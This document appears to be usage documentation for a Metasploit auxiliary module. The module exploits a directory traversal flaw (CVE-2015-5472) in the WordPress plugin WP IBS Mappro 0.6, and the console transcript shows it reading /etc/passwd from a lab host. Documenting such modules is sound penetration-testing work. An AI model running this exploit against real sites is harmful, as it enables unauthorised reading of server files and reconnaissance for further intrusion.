#### Add Wordpress Plugin IBS Mappro File Read Vulnerability.

  Application: Wordpress Plugin 'WP IBS Mappro' 0.6
  Homepage: https://wordpress.org/plugins/ibs-mappro/
  Source Code: https://downloads.wordpress.org/plugin/ibs-mappro.0.6.zip
  References: https://wpvulndb.com/vulnerabilities/8091

#### Vulnerable packages*
        
  0.6
  
#### Usage:

##### Linux (Ubuntu 12.04.5 LTS and 14.04.02 LTS):
```
msf > use auxiliary/scanner/http/wp_ibs_mappro_file_read 
msf auxiliary(wp_ibs_mappro_file_read) > show options 

Module options (auxiliary/scanner/http/wp_ibs_mappro_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads
   VHOST                       no        HTTP server virtual host

msf auxiliary(wp_ibs_mappro_file_read) > info

       Name: WordPress IBS Mappro File Read Vulnerability
     Module: auxiliary/scanner/http/wp_ibs_mappro_file_read
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Larry W. Cashdollar
  Roberto Soares Espreto <robertoespreto@gmail.com>

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  FILEPATH   /etc/passwd      yes       The path to the file to read
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port
  TARGETURI  /                yes       The base path to the wordpress application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host

Description:
  This module exploits a directory traversal vulnerability in 
  WordPress Plugin "WP IBS Mappro" version 0.6, allowing to read 
  arbitrary files with the web server privileges.

References:
  http://cvedetails.com/cve/2015-5472/
  https://wpvulndb.com/vulnerabilities/8091

msf auxiliary(wp_ibs_mappro_file_read) > set RHOSTS 192.168.1.57
RHOSTS => 192.168.1.57
msf auxiliary(wp_ibs_mappro_file_read) > check
[*] 192.168.1.57:80 - The target appears to be vulnerable.
[*] Checked 1 of 1 hosts (100% complete)
msf auxiliary(wp_ibs_mappro_file_read) > run

[*] Downloading file...
[+] 192.168.1.57:80 - File saved in: /home/espreto/.msf4/loot/20150729221014_default_192.168.1.57_ibsmappro.traver_038266.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_ibs_mappro_file_read) > head -10 /home/espreto/.msf4/loot/20150729221014_default_192.168.1.57_ibsmappro.traver_038266.txt
[*] exec: head -10 /home/espreto/.msf4/loot/20150729221014_default_192.168.1.57_ibsmappro.traver_038266.txt

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
msf auxiliary(wp_ibs_mappro_file_read) > set VERBOSE true
VERBOSE => true
msf auxiliary(wp_ibs_mappro_file_read) > run

[*] Downloading file...

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
...snip...
espreto:x:1000:1000:espreto,,,:/home/espreto:/bin/bash
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
postgres:x:115:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:116:126:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin
logstash:x:998:998:LogStash Service User:/var/lib/logstash:/usr/sbin/nologin
elasticsearch:x:118:128::/usr/share/elasticsearch:/bin/false

[+] 192.168.1.57:80 - File saved in: /home/espreto/.msf4/loot/20150729221030_default_192.168.1.57_ibsmappro.traver_037797.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(wp_ibs_mappro_file_read) >

```
